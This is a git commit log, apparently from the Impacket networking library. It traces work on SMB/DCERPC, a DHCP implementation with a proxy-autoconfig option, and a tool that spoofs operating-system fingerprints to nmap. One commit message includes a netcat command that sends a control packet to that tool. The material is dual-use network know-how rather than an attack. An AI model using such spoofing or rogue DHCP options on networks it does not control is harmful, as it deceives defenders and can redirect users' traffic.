    added fault nmapOSDB pointing to /usr/share/nmap/nmap-os-db

commit 44d1b6289013abac10065e9083c221a8f0dcea3c
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue May 12 22:30:22 2009 +0000

    renamed wpad option to 'proxy-autoconfig'

commit 55e978a741f5431648f21bd187f98a435d26c65c
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue May 12 21:10:19 2009 +0000

    added more options

commit a5bec1ba0ddfe992ce8eeb52961170cf574f5dfc
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon May 11 16:19:10 2009 +0000

    more dhcp options

commit 12c817ccac608f9d9288ebf4a89a4a5843c66e4e
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu May 7 21:18:16 2009 +0000

    added some more options
    decoding requested options too

commit 8dbe021b3b1d653a8926e16883450df5827504d2
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu May 7 16:13:02 2009 +0000

    typo

commit 1b3d4607155f65afac2a47c7a45c3d1bb574b091
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu May 7 16:11:13 2009 +0000

    added command line argument -d to specify the nmap-os-db file

commit 934278323ff7dc2a38705e58c80aa8f66f6ad59c
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed May 6 15:30:12 2009 +0000

    some refactoring, and added udp cmd packets, can be used like:
    
    echo cmd:exit | nc -u 192.168.66.254 12345

commit 336d2e8a25fcff64de10c39a0c62ff2226690aa2
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 30 21:29:16 2009 +0000

    added some DHCP options, more to come

commit aef20feb75d89ba55ecaf05e56878567c73c2c46
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 30 18:02:18 2009 +0000

    bug fix/improvement: self can be used in pack/unpack code for _ fields

commit 20726853474ad24a26594896977f9c71cd6afc29
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 29 22:23:51 2009 +0000

    proxy-autodiscovery is not a dhcp option, it's a parameter-request-list entry

commit 7d0f0968bfb801285a17fd75f3cf6a868c89ec99
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 29 22:20:02 2009 +0000

    can unpack options, and more options have names

commit 8c440da211b7b504c86ce52aedd0d29cda256bad
Author: lskladnik <lskladnik@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 29 21:26:10 2009 +0000

    Applied some fixes from Impact trunk.

commit 779940396f50dd8aac691e1230cf5928ae6f1063
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 29 21:09:25 2009 +0000

    unpacking of chaddr's length is now magic :)

commit 410c7008c9ad590bfcaa066eb8778542a9e66856
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 29 21:06:40 2009 +0000

    propper packing and unpacking of dhcp packets...
    unpacking of chaddr's length is not magic :(

commit 63f1e7351f8f97b37f8adcd8adbdef41d1570de7
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 29 20:51:49 2009 +0000

    fixed something on the structure for proper unpacking

commit 6cfd19ad51531ded058791c7f840da97b1900ff7
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 29 20:51:28 2009 +0000

    fixed a bug in calcUnpackSize() for '_' fields
    added some more debug info when .debug != false

commit 20cf2b995e45ec87aacef2ec3af5cdcfe60f5c32
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 29 20:31:51 2009 +0000

    fixed a bug when unpacking '_' fields

commit 4dccb28bcc52997a91f3011d9fabfd42f0cd2858
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 29 18:43:29 2009 +0000

    DHCP cheap implementation

commit 72bf82b859b948842c705d295526074166d404ca
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 29 16:27:38 2009 +0000

    parser for .pcap capture files

commit 2befae75032065e766c69970cbc7ec48c1c8ee4b
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 29 16:27:29 2009 +0000

    no real changes`

commit 3fa7ba9ba2a0db667a6c174c01e40763c2f82601
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Apr 28 19:55:46 2009 +0000

    an EthernetPacket can have just Data() inside, if this is the case,
    it should not ask the ether_type to the Data(), but instead use what's
    set in itself

commit 76228245df30d855b0c20e38e6fc520f73a9b30c
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Apr 28 19:06:19 2009 +0000

    default argument for msg in dump()

commit 979465e306d897f3f28a34d172c989a0455d47b3
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Apr 28 19:06:10 2009 +0000

    bug fix, uuid was set instead of objuuid

commit 41847ccf70b337c31206b7e7a1c1a8da18c68060
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 23 20:43:13 2009 +0000

    added impact compatibility

commit fffd897ec720ee11ca3eff026b682a3ad4d01b9b
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 23 20:02:50 2009 +0000

    fixed ClosedTCPResponder and added it to the list of responders
    
    initial seq number for TCPResponders is now according to the generator

commit 1704aedb569e93458af486e35bb176b75d7bd1bf
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Apr 20 21:17:19 2009 +0000

    # [x] TCP RST data checksum (RD)
    
    I forgot this test before, now we are really done

commit 6f798462f84f2b9a3949697e8f7a5ae784a2d892
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Apr 20 21:16:34 2009 +0000

    small module to compensate crc32

commit 21fde00a304ca7784be72f593eda3c41982a9e2b
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 16 20:28:59 2009 +0000

    # U1()
    # [x] Responsiveness (R)
    # [x] IP don't fragment bit (DF)
    # [x] IP initial time-to-live (T)
    # [x] IP initial time-to-live guess (TG)
    # [x] IP total length (IPL)
    # [x] Unused port unreachable field nonzero (UN)
    # [x] Returned probe IP total length value (RIPL)
    # [x] Returned probe IP ID value (RID)
    # [x] Integrity of returned probe IP checksum value (RIPCK)
    # [x] Integrity of returned probe UDP checksum (RUCK)
    # [x] Integrity of returned UDP data (RUD)
    # [-] ??? (TOS) Type of Service
    # [-] ??? (RUL) Length of return UDP packet is correct
    
    and we are done!

commit c32a707b4821d6960b93d3b7d37e0374c1ed947a
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 16 20:23:49 2009 +0000

    modified a little bit how default options are handlded

commit ed262c24999ca451c0b72da949396685e456eb48
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 16 20:23:02 2009 +0000

    # U1()
    # [x] Responsiveness (R)
    # [x] IP don't fragment bit (DF)
    # [x] IP initial time-to-live (T)
    # [x] IP initial time-to-live guess (TG)
    # [x] IP total length (IPL)
    # [x] Unused port unreachable field nonzero (UN)
    # [x] Returned probe IP total length value (RIPL)
    # [x] Returned probe IP ID value (RID)
    # [x] Integrity of returned probe IP checksum value (RIPCK)
    # [x] Integrity of returned probe UDP checksum (RUCK)
    # [ ] Integrity of returned UDP data (RUD)
    # [-] ??? (TOS) Type of Service
    # [-] ??? (RUL) Length of return UDP packet is correct

commit dae8dc625f9f5b43a17b24f532cf83ec9725fce3
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 16 20:18:52 2009 +0000

    # U1()
    # [x] Responsiveness (R)
    # [x] IP don't fragment bit (DF)
    # [x] IP initial time-to-live (T)
    # [x] IP initial time-to-live guess (TG)
    # [x] IP total length (IPL)
    # [x] Unused port unreachable field nonzero (UN)
    # [x] Returned probe IP total length value (RIPL)
    # [x] Returned probe IP ID value (RID)
    # [x] Integrity of returned probe IP checksum value (RIPCK)
    # [ ] Integrity of returned probe UDP checksum (RUCK)
    # [ ] Integrity of returned UDP data (RUD)
    # [-] ??? (TOS) Type of Service
    # [-] ??? (RUL) Length of return UDP packet is correct

commit 1f06a057216ba6f881a7520d462889c86b6c8d64
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 16 20:05:23 2009 +0000

    # U1()
    # [x] Responsiveness (R)
    # [x] IP don't fragment bit (DF)
    # [x] IP initial time-to-live (T)
    # [x] IP initial time-to-live guess (TG)
    # [x] IP total length (IPL)
    # [x] Unused port unreachable field nonzero (UN)
    # [x] Returned probe IP total length value (RIPL)
    # [x] Returned probe IP ID value (RID)
    # [ ] Integrity of returned probe IP checksum value (RIPCK)
    # [ ] Integrity of returned probe UDP checksum (RUCK)
    # [ ] Integrity of returned UDP data (RUD)
    # [-] ??? (TOS) Type of Service
    # [-] ??? (RUL) Length of return UDP packet is correct

commit f51f3777f97f60e40d25d9d97db1b533ab0ff04b
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 16 20:03:31 2009 +0000

    # U1()
    # [x] Responsiveness (R)
    # [x] IP don't fragment bit (DF)
    # [x] IP initial time-to-live (T)
    # [x] IP initial time-to-live guess (TG)
    # [x] IP total length (IPL)
    # [x] Unused port unreachable field nonzero (UN)
    # [x] Returned probe IP total length value (RIPL)
    # [ ] Returned probe IP ID value (RID)
    # [ ] Integrity of returned probe IP checksum value (RIPCK)
    # [ ] Integrity of returned probe UDP checksum (RUCK)
    # [ ] Integrity of returned UDP data (RUD)
    # [-] ??? (TOS) Type of Service
    # [-] ??? (RUL) Length of return UDP packet is correct

commit 291fdb9ca7a08cc92d26a9ee8a58af24d65b433f
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 16 20:00:24 2009 +0000

    # U1()
    # [x] Responsiveness (R)
    # [x] IP don't fragment bit (DF)
    # [x] IP initial time-to-live (T)
    # [x] IP initial time-to-live guess (TG)
    # [x] IP total length (IPL)
    # [x] Unused port unreachable field nonzero (UN)
    # [ ] Returned probe IP total length value (RIPL)
    # [ ] Returned probe IP ID value (RID)
    # [ ] Integrity of returned probe IP checksum value (RIPCK)
    # [ ] Integrity of returned probe UDP checksum (RUCK)
    # [ ] Integrity of returned UDP data (RUD)
    # [-] ??? (TOS) Type of Service
    # [-] ??? (RUL) Length of return UDP packet is correct

commit e1b8d774498052bb800a76726e58fce6693bceea
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 16 19:52:31 2009 +0000

    # U1()
    # [x] Responsiveness (R)
    # [x] IP don't fragment bit (DF)
    # [x] IP initial time-to-live (T)
    # [x] IP initial time-to-live guess (TG)
    # [x] IP total length (IPL)
    # [ ] Unused port unreachable field nonzero (UN)
    # [ ] Returned probe IP total length value (RIPL)
    # [ ] Returned probe IP ID value (RID)
    # [ ] Integrity of returned probe IP checksum value (RIPCK)
    # [ ] Integrity of returned probe UDP checksum (RUCK)
    # [ ] Integrity of returned UDP data (RUD)
    # [-] ??? (TOS) Type of Service
    # [-] ??? (RUL) Length of return UDP packet is correct

commit 0b62023ac0808c713b114b553a6cd49a13724c1d
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 16 19:35:16 2009 +0000

    # U1()
    # [x] Responsiveness (R)
    # [x] IP don't fragment bit (DF)
    # [x] IP initial time-to-live (T)
    # [x] IP initial time-to-live guess (TG)
    # [ ] IP total length (IPL)
    # [ ] Unused port unreachable field nonzero (UN)
    # [ ] Returned probe IP total length value (RIPL)
    # [ ] Returned probe IP ID value (RID)
    # [ ] Integrity of returned probe IP checksum value (RIPCK)
    # [ ] Integrity of returned probe UDP checksum (RUCK)
    # [ ] Integrity of returned UDP data (RUD)
    # [-] ??? (TOS) Type of Service
    # [-] ??? (RUL) Length of return UDP packet is correct

commit f32434874b4f021c91d09970c6ae08aa40449464
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 16 19:34:48 2009 +0000

    first tests on NMAP2UDPResponder
    # U1()
    # [x] Responsiveness (R)
    # [x] IP don't fragment bit (DF)
    # [x] IP initial time-to-live (T)

commit 8dabad50e2b2cb50760355671e11eac5f22ba3b3
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 16 18:58:48 2009 +0000

    added UDPResponder, ClosedUDPResponder and OpenUDPResponder... all working :)

commit 3eca8d639abe21d325894c976be0c125c358d442
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 16 18:43:29 2009 +0000

    initAnswer() --> buildAnswer()

commit 497d95c90b0d8bf18bd80c55641dbf1737a4ac1e
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 16 18:36:05 2009 +0000

    refactored a little bit:
    
        moved initAnswer() to the top class (Responder) and
        added the logic to initAnswer() -> sendPacket() to Responder.process()
    
        The open ports are now a list of ports, and only Machine knows about it
        Closed ports are not listed, are those not open

commit 1295ddabec5e130e1d4d94af3c86e0a78a3bdc19
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 15 23:18:07 2009 +0000

    marked a few more things done (they were done before, just not marked)

commit 832d3466ed2d0e1fa83dcc4b9bca208e0609d048
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 15 22:59:28 2009 +0000

    not randomizing the delta for stdDev

commit e5e61030944018d3e274151386291847dc18569e
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 15 22:52:11 2009 +0000

    # [x] IP ID sequence generation algorithm on ICMP messages (II)
    # [x] Shared IP ID sequence Boolean (SS)

commit c5efeea3751abfba64b03e279b6563c33201ffba
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 15 22:28:16 2009 +0000

    # [x] IP Type of Service (TOSI)

commit f34a8edbc5da9c56958287687287e535b8fea1b9
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 15 22:19:49 2009 +0000

    # [x] ICMP response code (CD)

commit 7b9e9248270aee95fdb9ff2b8987d68b16242b73
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 15 22:08:38 2009 +0000

    # [x] ICMP Sequence number (SI)

commit 23fba4a4d8c056519e0d2bf45af8613508a8f1ee
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 15 22:01:52 2009 +0000

    some safe checking on unsupported on IE(DFI) and IE(DLI)
    we should do this on every other option

commit bc9521c8df4ead35b661585f2a175b1818ef6bab
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 15 21:53:23 2009 +0000

    +# [x] IP Data Length (DLI)

commit d95ae313fd5c0bc7400a8464e71e165c22ef8f64
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 15 21:49:00 2009 +0000

    # IE()
    # [x] Responsiveness (R)
    # [x] Don't fragment (ICMP) (DFI)
    # [x] IP initial time-to-live (T)
    # [x] IP initial time-to-live guess (TG)

commit 31c0a58064441d017cc2be1ab8f25f5e2ef9d8ce
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 15 21:45:27 2009 +0000

    Improved a lot GCD, ISR and SP emulation!!!
    
    thanks to talking to aureliano we realized that if sequence numbers are
    generated on Timer events, then, the numbers are incremented only at this events
    and it doesn't matter how close we are sampling to the event, so we don't have
    to roung to the closes integer, but rather truncate to the previous

commit 383e915315c45681b70eb4aa6e4b7ee6cc4de7d2
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 15 19:40:31 2009 +0000

    +# [x] IP ID sequence generation algorithm (TI)
    +#   [x] Z  - All zeros
    +#   [x] RD - Random: It increments at least once by at least 20000.
    +#   [x] RI - Random positive increments. Any (delta_i > 1000, and delta_i % 256 != 0) or (delta_i > 256000 and delta_i % 256 == 0)

commit 5d8ea44b720a92f68b274f2716f2d7335292c8c5
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 15 19:39:37 2009 +0000

    fixed initial window size. it was fixed 0, and then, it was not hex encoeded

commit 6461e0937fbbbb24fe66a2f1293252a271f61dda
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 15 19:29:08 2009 +0000

    removed some void __init__()s
    bugfix: making a copy of the fingerprint from the machine, otherwise subsequent changes affect all references to the fingerprint (all SEQn where sharing and changing the same fingerprint)
    changed how test SP (stdDev) is computed and used. Now we are trying adding a random value

commit 08ce67bbe54e9002369d076cf7ba4a19acc3af89
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 15 19:26:18 2009 +0000

    set_ts_echo() was not working... at all

commit fc404cbd26ed65a40676ba3053ac10c3b833e6dd
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 15 16:43:44 2009 +0000

     # [ ] IP ID sequence generation algorithm (TI)
     +#   [+] Z  - All zeros
     +#   [+] RD - Random: It increments at least once by at least 20000.
     +#   [-] Hex Value - fixed IP ID
     +#   [+] RI - Random positive increments. Any (delta_i > 1000, and delta_i % 256 != 0) or (delta_i > 256000 and delta_i % 256 == 0)
     +#   [x] BI - Broken increment. All delta_i % 256 = 0 and all delta_i <= 5120.
     +#   [x] I - Incremental. All delta_i < 10
     +#   [x] O - (Ommited, the test does not show in the fingerprint). None of the other
    
    I also added simplifyFinerprints() which simplifies them by leaving only the first option when there are more than one (separated by | in the fingerprint file)

commit b9c705f8af50cfef3307f58f5749ee96a48e96ab
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 15 16:04:40 2009 +0000

    Added DF, MF and RF to the __str__ of IP packets
    Added ece and cwr to the __str__ of TCP packets

commit 81e730b94183f9dff86a75af4e2811a553033741
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 15 15:52:27 2009 +0000

    a few bugs introduced in the latest commit

commit cf55eb8068859f947404759ab639d0f7ff06df4d
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 15 15:46:37 2009 +0000

     # All Probes
    +# [|] SEQ
    +# [x] OPS
    +# [x] WIN
    
     # All Tests
    
     # SEQ()
    +# [x] TCP ISN sequence predictability index (SP)
    +# [x] TCP ISN greatest common divisor (GCD)
    +# [x] TCP ISN counter rate (ISR)
     # [ ] IP ID sequence generation algorithm (TI)
    +#   [ ] Z  - All zeros
    +#   [ ] RD - Random: It increments at least once by at least 20000.
    +#   [ ] Hex Value - fixed IP ID
    +#   [ ] RI - Random positive increments. Any (delta_i > 1000, and delta_i % 256 != 0) or (delta_i > 256000 and delta_i % 256 == 0)
    +#   [ ] BI - Broken increment. All delta_i % 256 = 0 and all delta_i <= 5120.
    +#   [ ] I - Incremental. All delta_i < 10
    +#   [ ] O - (Ommited, the test does not show in the fingerprint). None of the other
    +# [x] TCP timestamp option algorithm (TS)
    +#   [x] U - unsupported (don't send TS)
    +#   [x] 0 - Zero
    +#   [x] 1 - 0-5.66 (2 Hz)
    +#   [x] 7 - 70-150 (100 Hz)
    +#   [x] 8 - 150-350 (200 Hz)
    +#   [x]   - avg_freq = sum(TS_diff/time_diff) . round(.5 + math.log(avg_freq)/math.log(2)))
    +#           time_diff = 0.11 segs
     # OPS()
    +# [x] TCP options (O, O1-O6)
     # WIN()
    +# [x] TCP initial window size (W, W1-W6)
     # ECN, T1-T7
    +# [x] TCP options (O, O1-O6)
    +# [x] TCP initial window size (W, W1-W6)
    +# [ ] IP Type of Service (TOSI)
    +# [ ] ICMP Sequence number (SI)
    +# [ ] IP Data Length (DLI)
    +# [ ] ??? (TOS) Type of Service
    +# [ ] ??? (RUL) Length of return UDP packet is correct

commit 8305242cdcfe47d33fd78e3d70211b82d2557f8c
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 15 15:43:52 2009 +0000

    More complete:
    
    +# All Probes
    +# [ ] SEQ
    +# [ ] OPS
    +# [ ] WIN
    +# [x] T1
    +# [x] T2
    +# [x] T3
    +# [x] T4
    +# [x] T5
    +# [x] T6
    +# [x] T7
    +# [ ] IE
    +# [x] ECN
    +# [ ] U1
    +
    +# All Tests
    +
    +# SEQ()
    +# [ ] TCP ISN sequence predictability index (SP)
    +# [ ] TCP ISN greatest common divisor (GCD)
    +# [ ] TCP ISN counter rate (ISR)
    +# [ ] IP ID sequence generation algorithm (TI)
    +# [ ] IP ID sequence generation algorithm (CI)
    +# [-] IP ID sequence generation algorithm (II)
    +# [ ] Shared IP ID sequence Boolean (SS)
    +# [ ] TCP timestamp option algorithm (TS)
    +# OPS()
    +# [+] TCP options (O, O1-O6)
    +# WIN()
    +# [+] TCP initial window size (W, W1-W6)
    +# ECN, T1-T7
    +# [+] TCP options (O, O1-O6)
    +# [+] TCP initial window size (W, W1-W6)
    +# [x] Responsiveness (R)
    +# [x] IP don't fragment bit (DF)
    +# [x] IP initial time-to-live (T)
    +# [x] IP initial time-to-live guess (TG)
    +# [x] Explicit congestion notification (CC)
    +# [x] TCP miscellaneous quirks (Q)
    +# [x] TCP sequence number (S)
    +# [x] TCP acknowledgment number (A)
    +# [x] TCP flags (F)
    +# [ ] TCP RST data checksum (RD)
    +# IE()
    +# [ ] Responsiveness (R)
    +# [ ] Don't fragment (ICMP) (DFI)
    +# [ ] IP initial time-to-live (T)
    +# [ ] IP initial time-to-live guess (TG)
    +# [ ] ICMP response code (CD)
    +# [ ] ??? (TOSI)
    +# [ ] ??? (SI)
    +# [ ] ??? (DLI)
    +# U1()
    +# [ ] Responsiveness (R)
    +# [ ] IP don't fragment bit (DF)
    +# [ ] IP initial time-to-live (T)
    +# [ ] IP initial time-to-live guess (TG)
    +# [ ] IP total length (IPL)
    +# [ ] Unused port unreachable field nonzero (UN)
    +# [ ] Returned probe IP total length value (RIPL)
    +# [ ] Returned probe IP ID value (RID)
    +# [ ] Integrity of returned probe IP checksum value (RIPCK)
    +# [ ] Integrity of returned probe UDP checksum (RUCK)
    +# [ ] Integrity of returned UDP data (RUD)
    +# [ ] ??? (TOS)
    +# [ ] ??? (RUL)
    +

commit 4cd4227c484e8015ea2eaaeed5aeba8f7128eaa7
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 15 15:42:31 2009 +0000

    a bugfix, the this fix was ported to the orignal impact module

commit dab1808ee5fca4b042fe464abb3df39d5ffbdbff
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 15 15:40:14 2009 +0000

    This version answers ECN probes, although it's composing answers as
    it will be for any other probe. It still laks a few tests though,
    and all the SEQ(), IE() and U1()

commit 1dbf41b102a43b51b6346bd6f69e54ad8ab1de46
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 15 15:38:50 2009 +0000

    nmapAnswreingMachine.py is a tool to impersonate any stack for nmap's -O (OS fingerprint) option. It only supports nmap's second generation fingerprint DB
    
    os_ident.py is a modification of the IMPACT module, we take some classes defining the probe packets from it. We may want to trim this file before releasing

commit e843556daf05270e672418058b31cc4e133fb49e
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Feb 19 16:05:31 2009 +0000

    Fixing a bug reported by Bernd Deichmann <bd@deichmann-edv.de>.
    On some cards, and for some packets, extra data comes after the full packet.
    This fix uses the length in the IP header to cut the payload to its real length

commit b695aeed9526c3cfd5bf54c672ddfb9e3d7cb129
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Aug 1 19:54:40 2008 +0000

    changelong for last commit

commit 0c44c61ea526515943946cc2fea0be000905344a
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Aug 1 19:48:10 2008 +0000

    fix to TCP.get_echo_ts() submitted by Tom Coote

commit 984c3b4d62f9f80dd9f67531e6d64e2ca4167d16
Author: max <max@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 3 20:53:08 2006 +0000

    fixed bug in display_time (reported by grutz _at_ jingojango.net)
    cleaned up code using display_time

commit a951dea81b4ea743f7882cf3d29f156b77130f20
Author: max <max@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Sep 25 15:33:59 2006 +0000

    fixed setup.py where doc files were installed on usr/bin
    replaced @ in changelog with _at_, as some people are archiving packages on websites were spammers can crawl them

commit 9a2571ef2a09b21aa29ed6356323a1beac5e0b43
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Sep 6 15:54:08 2006 +0000

    __socket changes by buk

commit 43c482ef63a473cfd659ef0aad0bfe210228bf78
Author: max <max@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 28 14:57:03 2006 +0000

    fixed syntax error

commit f7196438bee94f3f6f9af23bdbccc225df2be10d
Author: max <max@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jun 23 18:33:29 2006 +0000

    fixed TCP.get_th_sum() bug reported by ranusy@gmail.com

commit 01b882774af2d070d1397077bc41f91168425a71
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue May 30 15:51:10 2006 +0000

    samr: Python 2.4 raises an exception where python 2.0 didn't. We need to
            catch it
    printer: RawCall() no more, now self.dce.call()

commit 65a98cfef8de4e62123c0e3a4b72b26a106b0330
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue May 23 22:26:51 2006 +0000

    retabbed

commit 2df6998ef99838e4b5f2bd73e6e8dc36c199613f
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue May 23 21:19:26 2006 +0000

    copyrights

commit 65be005f641a9e9337aa668122e8e97875388d21
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon May 22 22:19:58 2006 +0000

    new files aded

commit 01c4a4d45cce4c97c4d4353a6204d050473d41bb
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon May 22 22:16:38 2006 +0000

    new examples to show newer features

commit 2ce42b2faf6cd602eca47bd8fd4f8d4ca71d7576
Author: gera <gera@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon May 22 22:16:15 2006 +0000

    Lots of changes.
    SMB rewriten using Structure, added hashes authentication chainable
    commands, lots of commands, etc.
    DCERPC cleaned up, added authentication and encryption, fragmentation
    and more things

commit 2722624bc190069d4da0a4e62c136a665514001c
Author: max <max@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Apr 3 15:52:03 2006 +0000

    New release

commit f0bacb04cf69d120d6fc85a77b75218633b2c960
Author: max <max@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Apr 3 15:49:23 2006 +0000

    Fixed byte ordering bug when using IP_HDRINCL in BSD systems (patch supplied by ginga@ginganet.org).

commit 83e7538d2bdc2f4568e363c4d958ebd41347cffb
Author: max <max@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Apr 3 15:20:34 2006 +0000

    Fixes bug when parsing ARP packets

commit 8c4a96e91e896752636772c9943004e978c9370e
Author: max <max@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Sep 21 19:07:55 2005 +0000

    removed old import

commit 5202a11373dc03e683a7d37d4e7a1bfbb09586d0
Author: max <max@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jul 28 21:06:24 2005 +0000

    fixed bug in set_icmp_nextmtu()

commit f90e0848d3d6ffc2ebb44171699c0776e8213a07
Author: max <max@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jul 28 20:41:59 2005 +0000

    fixed icmp unreachable bug

commit 2a1e35ed7421a061fce93d3c215051721e06c526
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Feb 26 20:55:01 2004 +0000

    *** empty log message ***

commit f3c4b05728ed50c863548ff99a01e47b03206c5f
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Feb 26 20:54:45 2004 +0000

    Fixed as_{hrd,pro} methods to not invoke the tolist method, because they were being called with array objects as input, and anyway it wasn't necessary to call that method for what they did.

commit f9c57d8cec1569c56b99fcb4da4e6d5d19d67759
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 16 17:27:57 2003 +0000

    Fixed URL

commit 4511c3234966206b2b0ce0596b5be4fbf0d24d21
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 16 17:26:31 2003 +0000

    -

commit 890d9bf3e07197b17494e1f24399d2e2911a29c3
Author: jkohen <jkohen@ad9a8d78-5211-11de-8950-a5d9c972bc64>
